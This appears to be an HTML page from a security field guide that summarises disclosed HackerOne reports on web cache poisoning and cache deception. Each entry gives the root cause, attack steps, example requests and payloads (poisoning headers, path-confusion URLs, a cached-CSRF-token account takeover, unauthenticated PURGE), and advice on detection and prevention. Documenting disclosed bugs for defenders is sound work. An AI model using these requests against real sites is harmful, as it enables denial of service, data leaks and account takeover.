+<div class="spec-top"><h3>URL-encoded NUL in reflected param + oversized injection → poisoned cached JS → DoS</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#334709</b> · greenhouse · awarded · 32 votes · resolved</div>
+<div class="taxo"><span>Program <b>greenhouse</b></span><span>Surface <b>web</b></span><span>Chain <b>%00 truncation → oversized reflected URI → CDN cache poisoni</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The 'for' parameter is copied verbatim into a generated, CDN-cached JS file; terminating the customer key with %00 lets an attacker append a very large arbitrary string that is propagated into boardURI/applicationURI. The oversized cached URIs then exceed the server's URL limit (ERR_CONNECTION_CLOSED), bricking the job board for all visitors from the poisoned cache.</p>
+<h4>Method</h4><ol><li>Request the JS endpoint with for=&lt;validkey&gt;%00&lt;thousands of padding chars&gt;</li><li>Injected NUL truncates the key server-side but the padding is still reflected into boardURI/applicationURI in the generated JS</li><li>This JS is cached on the CDN; the poisoned applicationURI (~6155 bytes) makes the job-app iframe URL exceed the server limit → ERR_CONNECTION_CLOSED for every user loading the cached file</li></ol>
+<div class="pre">https://boards.greenhouse.io/embed/job_board/js?for=surveymonkey%00%00%00...%00654321   # %00 truncates key, padding poisons cached JS</div>
+<p class="insight"><b>Insight —</b> A URL-encoded %00 can pass a length/format validator while later string handling truncates at the NUL, letting you smuggle extra bytes into a reflected value; combine with a shared cache to convert reflection into a persistent DoS. Watch reflected params that end up in cached, length-sensitive URLs.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/334709" target="_blank" rel="noopener">hackerone.com/reports/334709</a></span><a class="src" href="#report-334709" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/web-cache-poisoning" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-1010858" style="--sv:var(--sev-med)" data-sev="2" data-votes="29" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Web cache poisoning via unkeyed X-Forwarded-* headers</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#1010858</b> · acronis · awarded · 29 votes · resolved</div>
+<div class="taxo"><span>Program <b>acronis</b></span><span>Surface <b>web</b></span><span>Chain <b>Unkeyed header reflection -&gt; cache poisoning -&gt; DoS / </b></span></div>
+<h4>Root cause</h4><p style="margin:0">The cache key excludes headers the origin actually reflects (X-Forwarded-Port, X-Forwarded-Url). Poisoning a response with these unkeyed inputs (using a unique cache-buster param first) makes the cache serve the malformed/injected response to all users of the real URL.</p>
+<h4>Method</h4><ol><li>Add a unique cache-buster query param to isolate a key</li><li>Send X-Forwarded-Port / X-Forwarded-Url with a poisoning value; confirm it's reflected (e.g. host:0 appears)</li><li>Send the same request WITHOUT the buster/headers until the poisoned entry is stored on the real key</li><li>Other users hitting the clean URL now receive the poisoned response</li></ol>
+<div class="pre">GET /path?cachebuster=1 HTTP/1.1
+Host: www.target
+X-Forwarded-Port: &lt;injection&gt;
+X-Forwarded-Url: &lt;injection&gt;
+# then replay clean GET /path to poison the shared key</div>
+<p class="insight"><b>Insight —</b> Enumerate unkeyed inputs with Param Miner (X-Forwarded-Host/Port/Url/Scheme, etc.); if the origin reflects one that isn't in the cache key, you can poison. DoS at minimum, XSS/redirect if the reflection is exploitable.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1010858" target="_blank" rel="noopener">hackerone.com/reports/1010858</a></span><a class="src" href="#report-1010858" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/web-cache-poisoning" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-1346618" style="--sv:var(--sev-med)" data-sev="2" data-votes="18" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Web cache poisoning via unkeyed Host header -&gt; DoS</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#1346618</b> · gsa_vdp · none · 18 votes · resolved</div>
+<div class="taxo"><span>Program <b>gsa_vdp</b></span><span>Surface <b>web</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The cache keys on path/query but not on the Host header. A request with an attacker-controlled Host (here host:port) is reflected into the app's behavior and cached, so subsequent victims are served a response that forces the app to make requests to the attacker-supplied host:port - breaking the page for everyone hitting that cache key.</p>
+<h4>Method</h4><ol><li>Find a cached page (X-Cache/age headers); pick a cache-buster query so you test without poisoning prod</li><li>Send request with an injected Host header (e.g. Host: target:8888)</li><li>Confirm the poisoned response is stored and served to normal visitors -&gt; app tries to reach the bad host:port and breaks</li></ol>
+<div class="pre">curl 'https://TARGET/?letme=4447' -H 'Host: TARGET:8888'
+# then GET https://TARGET/?letme=4447 as a victim -&gt; DoS state</div>
+<p class="insight"><b>Insight —</b> Classic cache-poisoning-to-DoS: probe unkeyed inputs (Host, X-Forwarded-Host/Port/Scheme, extra headers) and see if any get reflected into a cached response. If the app derives backend URLs/ports from Host, poisoning it breaks availability for all cache-key victims. Always use a cache-buster param while testing prod.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1346618" target="_blank" rel="noopener">hackerone.com/reports/1346618</a></span><a class="src" href="#report-1346618" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/web-cache-poisoning" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-921704" style="--sv:var(--sev-med)" data-sev="2" data-votes="17" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>CORS cache poisoning: reflected+cached Access-Control-Allow-Origin breaks cross-origin clients</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#921704</b> · automattic · awarded · 17 votes · resolved</div>
+<div class="taxo"><span>Program <b>automattic</b></span><span>Surface <b>web</b></span><span>Tag <b>cors</b></span></div>
+<h4>Root cause</h4><p style="margin:0">WordPress wp-json reflects the request Origin into Access-Control-Allow-Origin, and the cache stores that response WITHOUT keying on Origin. Poisoning the cache with an attacker Origin means all later cross-origin consumers get an ACAO that does not match their origin -&gt; browser blocks the response -&gt; DoS for any headless/decoupled front-end relying on that CORS endpoint.</p>
+<h4>Method</h4><ol><li>Confirm the endpoint reflects Origin into ACAO and is cached (X-Cache: hit)</li><li>Send several fetches with an arbitrary Origin to seat the poisoned ACAO in cache</li><li>A legit different-origin front-end now fails its CORS check on the cached response</li></ol>
+<div class="pre">fetch('https://TARGET/wp-json/').then(r=&gt;r.json())  // from an arbitrary origin, repeat 5-10x to poison</div>
+<p class="insight"><b>Insight —</b> When ACAO reflects Origin AND the response is cached unkeyed on Origin, you get an availability bug against decoupled/headless setups. Detection: reflect a junk Origin, look for X-Cache: hit, then verify a second origin gets the poisoned ACAO. Distinct from Host-header cache poisoning (#1346618) - here the unkeyed input is Origin.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/921704" target="_blank" rel="noopener">hackerone.com/reports/921704</a></span><a class="src" href="#report-921704" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/web-cache-poisoning" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-241323" style="--sv:var(--sev-med)" data-sev="2" data-votes="9" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Web cache deception via REQUEST_URI vs canonical path mismatch</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#241323</b> · automattic · awarded · 9 votes · resolved</div>
+<div class="taxo"><span>Program <b>automattic</b></span><span>Surface <b>web</b></span><span>Tag <b>cors</b></span></div>
+<h4>Root cause</h4><p style="margin:0">WooCommerce prevent_caching() decides whether to send no-cache headers by substring-matching $_SERVER[REQUEST_URI] against /cart//my-account//checkout/; prefixing the path with +, - or . defeats redirect_canonical and makes REQUEST_URI (/+my-account/) not match the needle (/my-account/), so the sensitive page is served cacheable.</p>
+<h4>Method</h4><ol><li>Request the sensitive page with a canonical-defeating prefix: /+my-account/ , /-cart/ , /.checkout/</li><li>redirect_canonical does not redirect these variants, but WordPress still resolves them to the real page</li><li>prevent_caching()'s REQUEST_URI match fails -&gt; no-cache headers omitted -&gt; page cached by proxy/plugin</li><li>Victim's cached personal page (cart/account) served to other users -&gt; cache deception</li></ol>
+<div class="pre">GET https://TARGET/+my-account/ HTTP/1.1
+GET https://TARGET/-cart/ HTTP/1.1
+GET https://TARGET/.cart/ HTTP/1.1</div>
+<p class="insight"><b>Insight —</b> When an app gates caching on the raw REQUEST_URI string, look for path variants (+ - . trailing slash, %2e, case) that resolve to the same page but dodge the exact-match cache guard. Compare cache headers between /page/ and /+page/.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/241323" target="_blank" rel="noopener">hackerone.com/reports/241323</a></span><a class="src" href="#report-241323" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/web-cache-poisoning" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-1025575" style="--sv:var(--sev-med)" data-sev="2" data-votes="8" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>CDN cache poisoning via unkeyed Accept-Version forcing 404</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#1025575</b> · nodejs-ecosystem · none · 8 votes · resolved</div>
+<div class="taxo"><span>Program <b>nodejs-ecosystem</b></span><span>Surface <b>web</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Fastify's always-on versioned routing returns 404 for any request carrying an Accept-Version header that no route matches, and the response omits a Vary: Accept-Version header. A fronting CDN/cache keys only on URL, so the poisoned 404 is served to all users of a valid URL.</p>
+<h4>Method</h4><ol><li>Identify a Fastify app behind a CDN/cache (Fastly, Varnish) with no explicit Vary on Accept-Version.</li><li>Request a legitimate, cacheable URL adding 'Accept-Version: &lt;garbage&gt;'.</li><li>Server returns 404 for the otherwise-valid route; cache stores the 404 under the URL cache key.</li><li>Subsequent normal users receive the cached 404 -&gt; denial of service on live URLs.</li></ol>
+<div class="pre">curl -v -H 'Accept-Version: tada' http://target/valid-route</div>
+<p class="insight"><b>Insight —</b> Hunt for request headers that change the response but are not part of the cache key (unkeyed inputs) AND are not listed in Vary. Framework 'features' (versioned routes, language negotiation, feature flags) are prime unkeyed-input sources for cache-poisoning DoS. Test by toggling a header and checking whether the error/variant response gets cached.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1025575" target="_blank" rel="noopener">hackerone.com/reports/1025575</a></span><a class="src" href="#report-1025575" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/web-cache-poisoning" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-1767503" style="--sv:var(--sev-med)" data-sev="2" data-votes="14" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Non-user-scoped cache key leaks data across users</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#1767503</b> · nextcloud · none · 14 votes · resolved</div>
+<div class="taxo"><span>Program <b>nextcloud</b></span><span>Surface <b>web</b></span></div>
+<h4>Root cause</h4><p style="margin:0">A server-side reference/preview cache uses a cachePrefix derived only from the resource id (boardId/cardId) and not from the requesting user, so a cached entry populated for an authorized user is served to any user who knows the id.</p>
+<h4>Method</h4><ol><li>Authorized user views a resource, causing the reference provider to populate the shared cache</li><li>Second user (who lacks direct access) requests the same resource id</li><li>Cache hit returns the first user's data without an access check</li></ol>
+<p class="insight"><b>Insight —</b> Audit every cache key: it must include the identity/authorization scope of the requester (userId/tenantId), not just the object id. A compare against a correct implementation is gold: here integration_github used userId as prefix and was safe, while deck used only cardId and leaked. Look for cachePrefix/cacheKey construction in code review.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1767503" target="_blank" rel="noopener">hackerone.com/reports/1767503</a></span><a class="src" href="#report-1767503" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/web-cache-poisoning" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-1848940" style="--sv:var(--sev-low)" data-sev="1" data-votes="82" data-bounty="500">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Cache poisoning of affiliate product via /../ path traversal in fetched URL</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#1848940</b> · shopify · USD 500 · 82 votes · resolved</div>
+<div class="taxo"><span>Program <b>shopify</b></span><span>Surface <b>web</b></span><span>Tag <b>cdn</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Linkpop's Amazon product fetcher parsed/normalized the supplied URL with a regex and cached the fetched product under a key derived from the path, but the origin (Amazon) resolves /dp/VICTIM/../ATTACKER to the attacker product. The attacker pre-warms the cache so the victim's legitimate /dp/VICTIM link resolves to the attacker's product.</p>
+<h4>Method</h4><ol><li>Obtain two Amazon product IDs (victim's target product and attacker's product), neither yet cached.</li><li>In an attacker Linkpop account, add an Amazon product using a traversal URL: https://amazon.ca/dp/[VICTIM-ID]/../[ATTACKER-ID] .</li><li>This caches the attacker product under the normalized /dp/[VICTIM-ID] key.</li><li>When the victim later adds their genuine https://www.amazon.ca/dp/[VICTIM-ID], the cached attacker product is displayed instead.</li></ol>
+<div class="pre">https://amazon.ca/dp/[VICTIM-PRODUCT-ID]/../[ATTACKER-PRODUCT-ID]</div>
+<p class="insight"><b>Insight —</b> When a server fetches a user-supplied URL and caches the result, a cache-key vs origin-resolution mismatch on path traversal (/../) lets you poison one key with another resource's content. General primitive: any URL-normalization difference between the cache-key function and the upstream fetcher is a content-spoofing lever. Note: reporter confirmed the click-through redirect did NOT actually work; impact is limited to spoofing the displayed product.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1848940" target="_blank" rel="noopener">hackerone.com/reports/1848940</a></span><a class="src" href="#report-1848940" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/web-cache-poisoning" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-260697" style="--sv:var(--sev-low)" data-sev="1" data-votes="58" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Web Cache Deception -&gt; CSRF-token leak -&gt; email change ATO</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#260697</b> · discourse · awarded · 58 votes · resolved</div>
+<div class="taxo"><span>Program <b>discourse</b></span><span>Surface <b>web</b></span><span>Chain <b>Web Cache Deception -&gt; steal CSRF token + username -&gt; </b></span><span>Tag <b>cache</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Authenticated pages that embed the CSRF token and username lack no-cache headers; a CDN (CloudFlare) caches versions requested with a static extension (.css), letting an attacker in the same CDN region fetch the victim's token, then CSRF the email-change endpoint.</p>
+<h4>Method</h4><ol><li>Force victim browser to request /u/&lt;rand&gt;.css (img tags) so CDN caches their authed page</li><li>Server-side, refetch the same URL from the same CDN region to read the cached CSRF token + X-Discourse-Username</li><li>Submit a cross-site email-change POST with the stolen token</li><li>Confirm attacker's email -&gt; account takeover</li></ol>
+<div class="pre">&lt;img src="https://TARGET/u/RAND.css"&gt;&lt;img src="https://TARGET/u/RAND.css" onerror="f()"&gt;
+// server-side fetch of /u/RAND.css extracts csrf-token + X-Discourse-Username
+POST /users/USER/preferences/email.json
+_method=PUT&amp;email=ATTACKER&amp;authenticity_token=STOLEN_CSRF</div>
+<p class="insight"><b>Insight —</b> Anti-CSRF tokens are only as safe as their cache headers. Look for token-bearing pages that return 200 on appended cacheable extensions (.css/.js) and lack Cache-Control/Pragma behind a CDN.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/260697" target="_blank" rel="noopener">hackerone.com/reports/260697</a></span><a class="src" href="#report-260697" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/web-cache-poisoning" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-1976449" style="--sv:var(--sev-low)" data-sev="1" data-votes="55" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>CPDoS via unkeyed X-Forwarded-Host header forcing a cached 404</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#1976449</b> · mozilla · none · 55 votes · resolved</div>
+<div class="taxo"><span>Program <b>mozilla</b></span><span>Surface <b>web</b></span><span>Tag <b>cdn</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The X-Forwarded-Host header is honored by the back-end (causing a 404/error) but is not part of the cache key. An attacker sends a request with a bogus X-Forwarded-Host; the resulting error response is stored and served to all subsequent users of that URL.</p>
+<h4>Method</h4><ol><li>Send a request to the target page adding a cache-buster query param (to avoid real-user impact during testing).</li><li>Add an X-Forwarded-Host header with an arbitrary/invalid value that makes the origin return an error (404).</li><li>Repeat until the error is cached, then load the URL (cache-buster) in a clean browser and confirm the cached 404.</li><li>For a real attack, drop the cache-buster and re-poison on an interval to keep the page down indefinitely.</li></ol>
+<div class="pre">GET /?my_cache_buster=test HTTP/1.1
+Host: developer.mozilla.org
+X-Forwarded-Host: XXX</div>
+<p class="insight"><b>Insight —</b> Unkeyed request headers (X-Forwarded-Host, X-Forwarded-Scheme, X-Host, X-Original-URL) that influence the origin response are classic web-cache-poisoning inputs. Probe each with Param Miner; if it changes the response but not the cache key, you have a poisoning primitive (error page = DoS, redirect/host = broader poisoning).</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1976449" target="_blank" rel="noopener">hackerone.com/reports/1976449</a></span><a class="src" href="#report-1976449" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/web-cache-poisoning" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-2764830" style="--sv:var(--sev-low)" data-sev="1" data-votes="49" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>HSTS cache: subdomain update overwrites parent entry (wrong keying)</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#2764830</b> · curl · none · 49 votes · resolved</div>
+<div class="taxo"><span>Program <b>curl</b></span><span>Surface <b>desktop</b></span></div>
+<h4>Root cause</h4><p style="margin:0">When persisting an HSTS policy for a subdomain, curl's cache write matched/updated the wrong entry, copying the subdomain's expiry onto the parent (and vice versa). A shared subdomain can thus alter the parent domain's HSTS lifetime.</p>
+<h4>Method</h4><ol><li>Seed an --hsts file with a parent entry (short expiry) and a subdomain entry</li><li>curl an HTTPS URL on the subdomain that sends Strict-Transport-Security: includeSubDomains</li><li>Re-inspect the hsts file: parent expiry now overwritten with the subdomain's value</li></ol>
+<div class="pre">.badssl.com "20241101 00:25:31"
+# curl -v --hsts ./testhsts.txt http://hsts.badssl.com/index.html   (run twice)
+# -&gt; .badssl.com expiry becomes the subdomain's long expiry</div>
+<p class="insight"><b>Insight —</b> When auditing cache/store code (HSTS, cookies, CORS, DNS, TLS session), check that the write path keys/matches on the exact same identity as intended. Sibling/parent/subdomain confusion in the key lets a lower-trust name poison a higher-trust entry.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/2764830" target="_blank" rel="noopener">hackerone.com/reports/2764830</a></span><a class="src" href="#report-2764830" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/web-cache-poisoning" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-1271944" style="--sv:var(--sev-low)" data-sev="1" data-votes="48" data-bounty="800">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Web cache deception via .css path confusion leaking PII and CSRF tokens</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#1271944</b> · shopify · USD 800 · 48 votes · resolved</div>
+<div class="taxo"><span>Program <b>shopify</b></span><span>Surface <b>web</b></span><span>Chain <b>WCD -&gt; cached CSRF token -&gt; CSRF protection bypass</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The cache keys/caches responses by the file extension in the URL rather than the origin's actual Content-Type. Appending a random &lt;name&gt;.css segment (or an encoded slash) to an authenticated page makes the edge cache the personalized 404/page body, which embeds the user's name, email, profile picture and a valid CSRF token.</p>
+<h4>Method</h4><ol><li>Take an authenticated page that echoes user data (help center account page, error page).</li><li>Append a random filename with a cacheable extension using path confusion, e.g. /copyright-and-trademark/abcdefg.css .</li><li>Lure the authenticated victim to open it; the edge caches the personalized response as if it were a static CSS file.</li><li>Fetch the same URL with curl (no cookies) and read the leaked PII / CSRF token from the cached body.</li><li>Variant: use an encoded slash (%25%32%46 -&gt; %2F -&gt; /) to smuggle path confusion past filters.</li></ol>
+<div class="pre">https://help.shopify.com/es/manual/your-account/copyright-and-trademark/abcdefg.css
+
+# encoded-slash path-confusion variant (leaks API key on another subdomain):
+https://hatchful.shopify.com/furniture-logo-maker%25%32%46random.css</div>
+<p class="insight"><b>Insight —</b> Any endpoint that reflects user data and sits behind an extension-based cache rule is a WCD candidate. Test a battery of static extensions (.css/.js/.jpg/.png/.txt) plus encoded-slash path confusion; the leaked CSRF token also breaks CSRF protection downstream. Fix is to cache on real Content-Type, not URL extension.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1271944" target="_blank" rel="noopener">hackerone.com/reports/1271944</a></span><a class="src" href="#report-1271944" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/web-cache-poisoning" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-2679440" style="--sv:var(--sev-low)" data-sev="1" data-votes="43" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Unauthenticated Varnish HTTP PURGE -&gt; arbitrary cache invalidation</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#2679440</b> · adobe · awarded · 43 votes · resolved</div>
+<div class="taxo"><span>Program <b>adobe</b></span><span>Surface <b>web</b></span></div>
+<h4>Root cause</h4><p style="margin:0">A Varnish cache in front of the site accepts the HTTP PURGE (and often BAN) method from any client because the ACL restricting purge to internal IPs is missing/misconfigured, allowing an attacker to evict cached objects at will.</p>
+<h4>Method</h4><ol><li>Identify Varnish (Via/X-Varnish headers, X-Cache).</li><li>Send a PURGE request for a cached URL and observe a 200/purged response.</li><li>Repeatedly purge hot objects to force origin load / cache-stampede DoS.</li></ol>
+<div class="pre">curl -i -X PURGE https://TARGET/some/cached/path
+# also test: -X BAN , and BAN via headers</div>
+<p class="insight"><b>Insight —</b> Against Varnish/Fastly/Nginx-cache, test the PURGE and BAN methods unauthenticated. Even without content injection, unrestricted purge is a cache-stampede DoS primitive; combined with cache poisoning it is worse. Purge ACL should be internal-only.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/2679440" target="_blank" rel="noopener">hackerone.com/reports/2679440</a></span><a class="src" href="#report-2679440" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/web-cache-poisoning" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-2860983" style="--sv:var(--sev-low)" data-sev="1" data-votes="24" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>CPDoS via X-HTTP-Method-Override: HEAD caching an empty-body 200</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#2860983</b> · mozilla · none · 24 votes · resolved</div>
+<div class="taxo"><span>Program <b>mozilla</b></span><span>Surface <b>web</b></span><span>Tag <b>cdn</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The origin honors X-HTTP-Method-Override: HEAD and processes a GET as a HEAD, returning 200 OK with an empty body. The cache stores that empty 200 under the static resource's key, so the file (image/JS) becomes empty for all users.</p>
+<h4>Method</h4><ol><li>Choose a cached static resource (image, or the single homepage JS bundle).</li><li>Send a GET with header X-HTTP-Method-Override: HEAD (use a query-string cache-buster where the query is part of the cache key to test safely).</li><li>The origin returns a 200 with empty body which is cached.</li><li>Load the resource normally and confirm it is now empty/broken for everyone, breaking site functionality (DoS).</li></ol>
+<div class="pre">curl -H "X-HTTP-Method-Override: HEAD" "https://addons.allizom.org/static-server/img/addon-icons/default-64.d144b50f2bb8.png?dontpoisoneveryone=1"</div>
+<p class="insight"><b>Insight —</b> Method-override headers (X-HTTP-Method-Override, X-HTTP-Method, X-Method-Override) can flip a cacheable GET into a HEAD/other verb at the origin while the cache still stores the result under the GET key -&gt; empty-body CPDoS. Part of the CPDoS family (see cpdos.org/#HMO); pair with cache-buster query params only when the query string is actually part of the cache key.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/2860983" target="_blank" rel="noopener">hackerone.com/reports/2860983</a></span><a class="src" href="#report-2860983" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/web-cache-poisoning" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-263760" style="--sv:var(--sev-none)" data-sev="0" data-votes="48" data-bounty="1120">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Recover private/deleted content from preview cache via callback enumeration</h3><span class="fieldmark">◆ Info</span></div>
+<div class="catalog">Specimen <b>#263760</b> · x · USD 1120 · 48 votes · resolved</div>
+<div class="taxo"><span>Program <b>x</b></span><span>Surface <b>web</b></span></div>
+<h4>Root cause</h4><p style="margin:0">A search/widget preview endpoint caches responses and ignores no-cache request headers. Each JSONP callback name (tl_i1..tl_iN) is a distinct cache key, so stale cached results (including tweets that became private or were deleted after caching) can be replayed by iterating callback indices.</p>
+<h4>Method</h4><ol><li>Open the widget preview request in Burp; note callback=__twttr.callbacks.tl_iN_preview_old</li><li>Add Accept-Encoding: gzip, deflate, br to force the cached (compressed) variant</li><li>Iterate N (i1..i200) to hit cache entries not yet overwritten with fresh data</li><li>Read cached results for a now-private/deleted account</li></ol>
+<div class="pre">GET /widgets/timelines/preview?all_results=on&amp;callback=__twttr.callbacks.tl_i&lt;N&gt;_preview_old&amp;query=&lt;target&gt;&amp;timeline_type=search&amp;suppress_response_codes=true
+Accept-Encoding: gzip, deflate, br</div>
+<p class="insight"><b>Insight —</b> Preview/embed/oEmbed/widget endpoints frequently cache aggressively and honor JSONP callback params as cache keys. Enumerate the callback/index space and toggle Accept-Encoding/Vary inputs to surface stale snapshots of content that is now private or deleted.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/263760" target="_blank" rel="noopener">hackerone.com/reports/263760</a></span><a class="src" href="#report-263760" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/web-cache-poisoning" target="_blank" rel="noopener">⚑ Lab</a></div></article></div>
+    <button class="loadmore" id="loadmore">Load more specimens (12 of 36 remaining)</button>
+    <h2 class="sec" id="refs"><span class="tick">§</span>References &amp; practice</h2>
+<ol class="refs">
+<li>PortSwigger Web Security Academy — <a href="https://portswigger.net/web-security/web-cache-poisoning" target="_blank" rel="noopener">Web cache poisoning labs</a> (hands-on practice).</li>
+<li>All 36 disclosed reports for this class are catalogued as specimens above.</li>
+<li>See also: <a href="../chains.html">exploit chains</a> · <a href="../payloads.html">payload libraries</a> · <a href="../methodology/recon.html">methodology</a>.</li>
+</ol>
+  </main>
+  <nav class="toc" aria-label="In this entry"><h5>In this entry</h5><a href="#basic-information">Basic information</a><a href="#methodology">Methodology</a><a href="#web-cache-deception-wcd">Web Cache Deception (WCD)</a><a href="#static-extension-path-confusion" style="padding-left:24px">↳ Static-extension path confusion</a><a href="#grep-the-cached-body-for-auth-material-not-just-pii" style="padding-left:24px">↳ Grep the cached body for auth material, not just PII</a><a href="#cacheable-response-that-carries-set-cookie" style="padding-left:24px">↳ Cacheable response that carries Set-Cookie</a><a href="#web-cache-poisoning-wcp">Web Cache Poisoning (WCP)</a><a href="#unkeyed-header-reflected-into-links-redirects" style="padding-left:24px">↳ Unkeyed header reflected into links / redirects</a><a href="#cache-key-normalization-mismatch-cpdos" style="padding-left:24px">↳ Cache-key normalization mismatch → CPDoS</a><a href="#method-verb-special-header-desync" style="padding-left:24px">↳ Method/verb &amp; special-header desync</a><a href="#reflected-origin-in-cors-headers-cached" style="padding-left:24px">↳ Reflected Origin in CORS headers, cached</a><a href="#bypasses">Bypasses</a><a href="#escalation-impact">Escalation &amp; impact</a><a href="#prevention">Prevention</a><a href="#tools">Tools</a><a href="#specimens">Specimens (36)</a><a href="#refs">References</a><h5 style="margin-top:22px">Practice</h5><a href="https://portswigger.net/web-security/web-cache-poisoning" target="_blank" rel="noopener">⚑ PortSwigger: Web cache poisoning</a></nav>
+</div>
+<footer class="foot"><img class="seal" src="/favicon.jpg" alt="Logo"><span>The Hacktivity Field Guide — distilled from disclosed HackerOne reports for defensive, educational research. Every specimen cites <code>hackerone.com/reports/&lt;id&gt;</code>.</span></footer>
+<script src="../assets/app.js"></script></body></html>
